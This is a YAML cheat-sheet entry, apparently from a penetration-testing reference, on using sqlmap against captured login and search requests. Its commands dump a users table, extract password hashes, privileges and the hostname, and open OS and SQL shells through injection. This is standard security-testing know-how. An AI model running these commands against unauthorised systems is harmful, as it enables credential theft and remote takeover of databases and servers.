---
description: |
  SQLMap is an automated SQL injection tool that helps identify and exploit SQL injection vulnerabilities in web applications. The following commands demonstrate how to extract databases, tables, and credentials, as well as gain shell access through SQL injection.

  Command Reference:
  ```
  -r: file with the request (from Burp)

  -p: vulnerable parameter

  -D: database name

  -T: table name

  --dump: action to be performed
  ```
command: |
  sqlmap -r request_login.txt -p uname --risk=3 --level 5 -D music -T users --dump 

code: |
  sqlmap -r request_login.txt -p song --risk 3 --level 5  --current-user
  sqlmap -r request_login.txt -p song --risk 3 --level 5  --is-dba
  sqlmap -r request_login.txt -p song --risk 3 --level 5  --hostname
  sqlmap -r request_login.txt -p song --risk 3 --level 5  --passwords
  sqlmap -r request_login.txt -p song --risk 3 --level 5  --privileges
  sqlmap -r request_login.txt -p song --risk 3 --level 5  --os-shell
  sqlmap -r search.txt -p artist --risk 3 --level 5  --sql-shell

items:
  - No_Creds
services:
  - SQL
OS:
  - Windows
  - Linux
  - Mac
attack_types:
  - Injection
  - Enumeration
  - Exploitation
references:
  - https://www.evolvesecurity.com/blog-posts/tools-of-the-trade-your-ally-in-uncovering-sql-injection-vulnerabilities
  - https://medium.com/cybersecurity-101/exploring-sql-injection-with-sqlmap-a-practical-guide-09e56e04d00f
---